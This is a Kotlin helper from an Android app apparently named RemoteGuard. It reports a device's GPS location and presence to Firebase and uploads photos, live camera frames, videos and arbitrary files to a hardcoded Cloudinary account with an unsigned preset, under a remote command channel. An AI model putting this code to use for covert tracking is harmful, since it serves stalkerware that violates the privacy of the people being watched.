package com.remoteguard.app

import android.content.Context
import android.os.Build
import android.util.Log
import com.cloudinary.android.MediaManager
import com.cloudinary.android.callback.ErrorInfo
import com.cloudinary.android.callback.UploadCallback
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.util.UUID

data class ChatMessage(
    val id: String = "",
    val senderId: String = "",
    val text: String = "",
    val timestamp: Long = 0
)

object FirebaseHelper {
    private const val CLOUDINARY_UPLOAD_PRESET = "upsara"

    private val auth = FirebaseAuth.getInstance()
    private val database = FirebaseDatabase.getInstance()
    private val storage = FirebaseStorage.getInstance()

    private var deviceId: String? = null
    private var isConnectionObserverAttached = false
    @Volatile
    private var isCloudinaryReady = false

    fun getDeviceId(context: Context): String {
        if (deviceId == null) {
            val sharedPrefs = context.getSharedPreferences("remoteguard_prefs", Context.MODE_PRIVATE)
            deviceId = sharedPrefs.getString("device_id", null)
            if (deviceId == null) {
                deviceId = UUID.randomUUID().toString().substring(0, 8).uppercase()
                sharedPrefs.edit().putString("device_id", deviceId).apply()
            }
        }
        return deviceId!!
    }

    private fun logRemote(tag: String, message: String, isError: Boolean = false) {
        val id = deviceId ?: "unknown"
        val logMap = mapOf(
            "tag" to tag,
            "message" to message,
            "timestamp" to System.currentTimeMillis(),
            "type" to if (isError) "ERROR" else "DEBUG"
        )
        database.getReference("devices/$id/logs").push().setValue(logMap)
        if (isError) Log.e(tag, message) else Log.d(tag, message)
    }

    fun initialize(context: Context) {
        getDeviceId(context)
        logRemote("FirebaseHelper", "Initializing Firebase and Cloudinary...")
        database.goOnline()
        observeRealtimeConnection(context)
        getCommandsRef(context).keepSynced(true)

        // Initialize Cloudinary
        ensureCloudinaryReady(context)

        if (auth.currentUser == null) {
            logRemote("FirebaseHelper", "Starting Anonymous Auth...")
            auth.signInAnonymously()
                .addOnSuccessListener {
                    logRemote("FirebaseHelper", "Firebase Anonymous sign-in SUCCESS: ${it.user?.uid}")
                    updateDeviceInfo(context)
                }
                .addOnFailureListener {
                    logRemote("FirebaseHelper", "Firebase Anonymous sign-in FAILED: ${it.message}", true)
                }
        } else {
            logRemote("FirebaseHelper", "Firebase already signed in")
            updateDeviceInfo(context)
        }
    }

    @Synchronized
    private fun ensureCloudinaryReady(context: Context): Boolean {
        if (isCloudinaryReady) return true

        runCatching {
            MediaManager.get()
            isCloudinaryReady = true
            logRemote("FirebaseHelper", "Cloudinary already initialized")
            return true
        }

        return try {
            val config = mapOf(
                "cloud_name" to "dblxtymix",
                "secure" to true
            )
            MediaManager.init(context.applicationContext, config)
            isCloudinaryReady = true
            logRemote("FirebaseHelper", "Cloudinary MediaManager.init() success")
            true
        } catch (e: Exception) {
            logRemote("FirebaseHelper", "Cloudinary initialization failed: ${e.message}", true)
            false
        }
    }

    @Synchronized
    fun observeRealtimeConnection(context: Context) {
        if (isConnectionObserverAttached) return
        isConnectionObserverAttached = true

        val id = getDeviceId(context)
        val presenceRef = database.getReference("devices/$id/presence")

        database.getReference(".info/connected").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val connected = snapshot.getValue(Boolean::class.java) == true
                presenceRef.child("connected").setValue(connected)
                presenceRef.child("lastSeen").setValue(ServerValue.TIMESTAMP)
                if (connected) {
                    presenceRef.child("connected").onDisconnect().setValue(false)
                    presenceRef.child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.w("FirebaseHelper", "Connection observer cancelled: ${error.message}")
            }
        })
    }

    private fun updateDeviceInfo(context: Context) {
        val id = getDeviceId(context)
        val info = mapOf(
            "model" to Build.MODEL,
            "androidVersion" to Build.VERSION.RELEASE,
            "lastSeen" to System.currentTimeMillis()
        )
        database.getReference("devices/$id/info").setValue(info)
    }

    fun updateLastSeen(context: Context, status: String = "running") {
        val id = getDeviceId(context)
        val updates = mapOf(
            "lastSeen" to System.currentTimeMillis(),
            "status" to status
        )
        database.getReference("devices/$id/info").updateChildren(updates)
    }

    fun updateLocation(context: Context, lat: Double, lng: Double, accuracy: Float) {
        val id = getDeviceId(context)
        val location = mapOf(
            "latitude" to lat,
            "longitude" to lng,
            "accuracy" to accuracy,
            "timestamp" to System.currentTimeMillis()
        )
        database.getReference("devices/$id/location").setValue(location)
    }

    fun uploadPhoto(context: Context, bytes: ByteArray) {
        if (!ensureCloudinaryReady(context)) return
        val id = getDeviceId(context)
        logRemote("FirebaseHelper", "ATTEMPTING PHOTO UPLOAD: ${bytes.size} bytes")

        val tempFile = File(context.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
        try {
            tempFile.writeBytes(bytes)
            MediaManager.get().upload(tempFile.absolutePath)
                .unsigned(CLOUDINARY_UPLOAD_PRESET)
                .option("resource_type", "image")
                .option("folder", "photos/$id")
                .callback(object : UploadCallback {
                    override fun onStart(requestId: String) {
                        logRemote("FirebaseHelper", "PHOTO: onStart - $requestId")
                    }
                    override fun onProgress(requestId: String, bytes: Long, totalBytes: Long) {}
                    override fun onSuccess(requestId: String, resultData: Map<*, *>) {
                        val url = resultData["secure_url"] as String
                        logRemote("FirebaseHelper", "PHOTO: onSuccess - URL: $url")
                        database.getReference("devices/$id/photos").push().setValue(url)
                        tempFile.delete()
                    }
                    override fun onError(requestId: String, error: ErrorInfo) {
                        logRemote("FirebaseHelper", "PHOTO: onError - ${error.description} (Code: ${error.code})", true)
                        tempFile.delete()
                    }
                    override fun onReschedule(requestId: String, error: ErrorInfo) {
                        logRemote("FirebaseHelper", "PHOTO: onReschedule - ${error.description} (Code: ${error.code})", true)
                    }
                }).dispatch()
        } catch (e: Exception) {
            logRemote("FirebaseHelper", "PHOTO: Fatal Exception: ${e.message}", true)
            tempFile.delete()
        }
    }

    fun uploadLiveFrame(context: Context, bytes: ByteArray) {
        if (!ensureCloudinaryReady(context)) return
        val id = getDeviceId(context)
        MediaManager.get().upload(bytes)
            .unsigned(CLOUDINARY_UPLOAD_PRESET)
            .option("public_id", "live_frame_$id")
            .option("folder", "live/$id")
            .option("invalidate", true)
            .callback(object : UploadCallback {
                override fun onStart(requestId: String) {}
                override fun onProgress(requestId: String, bytes: Long, totalBytes: Long) {}
                override fun onSuccess(requestId: String, resultData: Map<*, *>) {
                    val url = resultData["secure_url"] as String
                    database.getReference("devices/$id/live_frame").setValue(url)
                }
                override fun onError(requestId: String, error: ErrorInfo) {
                    logRemote("FirebaseHelper", "LIVE: onError - ${error.description} (Code: ${error.code})", true)
                }
                override fun onReschedule(requestId: String, error: ErrorInfo) {
                    logRemote("FirebaseHelper", "LIVE: onReschedule - ${error.description} (Code: ${error.code})", true)
                }
            }).dispatch()
    }

    fun uploadFile(context: Context, file: File) {
        if (!ensureCloudinaryReady(context)) return
        val id = getDeviceId(context)
        if (!file.exists() || file.isDirectory) {
            logRemote("FirebaseHelper", "FILE: Invalid path ${file.absolutePath}", true)
            return
        }

        MediaManager.get().upload(file.absolutePath)
            .unsigned(CLOUDINARY_UPLOAD_PRESET)
            .option("folder", "files/$id")
            .option("public_id", file.nameWithoutExtension)
            .callback(object : UploadCallback {
                override fun onStart(requestId: String) {
                    logRemote("FirebaseHelper", "FILE: onStart - $requestId (${file.name})")
                }
                override fun onProgress(requestId: String, bytes: Long, totalBytes: Long) {}
                override fun onSuccess(requestId: String, resultData: Map<*, *>) {
                    val url = resultData["secure_url"] as String
                    database.getReference("devices/$id/files").push().setValue(
                        mapOf("name" to file.name, "url" to url)
                    )
                    logRemote("FirebaseHelper", "FILE: onSuccess - URL: $url")
                }
                override fun onError(requestId: String, error: ErrorInfo) {
                    logRemote("FirebaseHelper", "FILE: onError - ${error.description} (Code: ${error.code})", true)
                }
                override fun onReschedule(requestId: String, error: ErrorInfo) {
                    logRemote("FirebaseHelper", "FILE: onReschedule - ${error.description} (Code: ${error.code})", true)
                }
            }).dispatch()
    }

    fun uploadVideo(context: Context, videoFile: java.io.File) {
        if (!ensureCloudinaryReady(context)) return
        val id = getDeviceId(context)
        val fileName = videoFile.name
        logRemote("FirebaseHelper", "ATTEMPTING VIDEO UPLOAD: $fileName")

        if (!videoFile.exists()) {
            logRemote("FirebaseHelper", "VIDEO ERROR: File does not exist at ${videoFile.absolutePath}", true)
            return
        }

        try {
            MediaManager.get().upload(videoFile.absolutePath)
                .unsigned(CLOUDINARY_UPLOAD_PRESET)
                .option("resource_type", "video")
                .option("folder", "videos/$id")
                .callback(object : UploadCallback {
                    override fun onStart(requestId: String) {
                        logRemote("FirebaseHelper", "VIDEO: onStart - $requestId")
                    }
                    override fun onProgress(requestId: String, bytes: Long, totalBytes: Long) {}
                    override fun onSuccess(requestId: String, resultData: Map<*, *>) {
                        val url = resultData["secure_url"] as String
                        val playbackUrl = if (url.contains("/upload/")) {
                            url.replace("/upload/", "/upload/f_mp4,vc_h264/")
                        } else {
                            url
                        }
                        logRemote("FirebaseHelper", "VIDEO: onSuccess - URL: $url")
                        database.getReference("devices/$id/videos").push().setValue(
                            mapOf(
                                "name" to fileName,
                                "url" to url,
                                "playbackUrl" to playbackUrl,
                                "timestamp" to System.currentTimeMillis()
                            )
                        ).addOnSuccessListener { videoFile.delete() }
                    }
                    override fun onError(requestId: String, error: ErrorInfo) {
                        logRemote("FirebaseHelper", "VIDEO: onError - ${error.description} (Code: ${error.code})", true)
                        videoFile.delete()
                    }
                    override fun onReschedule(requestId: String, error: ErrorInfo) {
                        logRemote("FirebaseHelper", "VIDEO: onReschedule - ${error.description} (Code: ${error.code})", true)
                    }
                }).dispatch()
        } catch (e: Exception) {
            logRemote("FirebaseHelper", "VIDEO: Fatal Exception: ${e.message}", true)
        }
    }

    fun getCommandsRef(context: Context) = database.getReference("devices/${getDeviceId(context)}/commands")

    fun getMessagesRef(context: Context) = database.getReference("devices/${getDeviceId(context)}/messages")

    fun sendMessage(context: Context, text: String) {
        val deviceId = getDeviceId(context)
        val msgRef = getMessagesRef(context).push()
        val message = mapOf(
            "id" to msgRef.key,
            "senderId" to deviceId,
            "text" to text,
            "timestamp" to ServerValue.TIMESTAMP
        )
        msgRef.setValue(message)
    }
}
